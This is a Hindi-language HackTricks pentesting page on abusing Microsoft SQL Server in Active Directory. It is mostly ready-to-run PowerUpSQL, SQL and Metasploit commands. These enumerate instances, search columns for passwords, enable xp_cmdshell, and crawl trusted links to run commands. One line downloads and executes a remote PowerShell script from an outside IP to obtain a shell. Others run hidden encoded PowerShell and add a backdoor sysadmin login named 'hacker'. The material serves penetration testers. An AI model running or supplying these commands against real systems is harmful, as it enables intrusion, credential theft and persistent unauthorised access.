# MSSQL AD दुरुपयोग

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें।
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud)** को PR जमा करके।

</details>

## **MSSQL गणना / खोज** 

पावरशेल मॉड्यूल [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) इस मामले में बहुत उपयोगी है।
```powershell
Import-Module .\PowerupSQL.psd1
```
### डोमेन सत्र के बिना नेटवर्क से जांचें
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### डोमेन के अंदर से जांच करना
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## MSSQL मूल दुरुपयोग

### डेटाबेस तक पहुंचें
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

MSSQL होस्ट के अंदर **कमांड निष्पादित** करना संभव हो सकता है
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
### MSSQL मूल हैकिंग ट्रिक्स

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## MSSQL विश्वसनीय लिंक

यदि एक MSSQL इंस्टेंस एक विभिन्न MSSQL इंस्टेंस द्वारा विश्वसनीय है (डेटाबेस लिंक)। यदि उपयोगकर्ता के पास विश्वसनीय डेटाबेस पर विशेषाधिकार हैं, तो उसे **विश्वास संबंध का उपयोग करके अन्य इंस्टेंस में भी क्वेरी को निष्पादित करने की क्षमता होगी**। ये विश्वास जोड़े जा सकते हैं और किसी समय पर उपयोगकर्ता को कुछ गलत रूप से कॉन्फ़िगर किए गए डेटाबेस का पता लगा सकता है जहां वह कमांड निष्पादित कर सकता है।

**डेटाब
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

आप मेटास्प्लॉइट का उपयोग करके आसानी से विश्वसनीय लिंक की जांच कर सकते हैं।
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
**ध्यान दें** कि metasploit केवल MSSQL में `openquery()` फ़ंक्शन का दुरुपयोग करने की कोशिश करेगा (इसलिए, यदि आप `openquery()` के साथ कमांड नहीं चला सकते हैं तो आपको कमांड चलाने के लिए `EXECUTE` विधि का प्रयास करना होगा, नीचे अधिक देखें।)

### मैनुअल - Openquery()

**Linux** से आप **sqsh** और **mssqlclient.py** के साथ MSSQL कंसोल शैल प्राप्त कर सकते हैं।

**Windows** से आप भी [**HeidiSQL**](https://www.heidisql.com) जैसे **MSSQL client** का उपयोग करके लिंक्स खोज सकते हैं और कमांड्स को मैन्युअल रूप से चला सकते हैं।

_विंडोज प्रमाणीकरण का उपयोग करके लॉगिन:_

![](<../../.gitbook/assets/image (167) (1).png>) 

#### विश्वसनीय लिंक्स खोजें
```sql
select * from master..sysservers
```
![](<../../.gitbook/assets/image (168).png>)

#### विश्वसनीय लिंक में क्वेरी चलाएं

लिंक के माध्यम से क्वेरी चलाएं (उदाहरण: नए पहुंचने योग्य इंस्टेंस में अधिक लिंक खोजें):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
जांचें कि कहाँ डबल और सिंगल कोट्स का उपयोग किया गया है, इसे उसी तरह से उपयोग करना महत्वपूर्ण है।
{% endhint %}

![](<../../.gitbook/assets/image (169).png>)

आप इन विश्वसनीय लिंक श्रृंखलाओं को हमेशा के लिए मैन्युअल रूप से जारी रख सकते हैं।
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
### मैनुअल - EXECUTE

आप `EXECUTE` का उपयोग करके विश्वसनीय लिंक का दुरुपयोग कर सकते हैं:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## स्थानीय विशेषाधिकार उन्नयन

**MSSQL स्थानीय उपयोगकर्ता** के पास आम तौर पर एक विशेष प्रकार की विशेषाधिकार होती है जिसे **`SeImpersonatePrivilege`** कहा जाता है। यह खाता "प्रमाणीकरण के बाद ग्राहक का अनुकरण करने" की अनुमति देता है।

एक रणनीति जिसे कई लेखकों ने विकसित किया है, वह है कि एक SYSTEM सेवा को एक धूर्त या मध्यस्थ सेवा के लिए प्रमाणीकरण करने के लिए मजबूर किया जाए। फिर यह धूर्त सेवा सिस्टम सेवा का अनुकरण कर सकती है जब वह प्रमाणीकरण करने की कोशिश कर रही हो।

[SweetPotato](https://github.com/CCob/SweetPotato) में इन विभिन्न तकनीकों का संग्रह है जो Beacon के `execute-assembly` कमांड के माध्यम से क्रियान्वित किए जा सकते हैं।
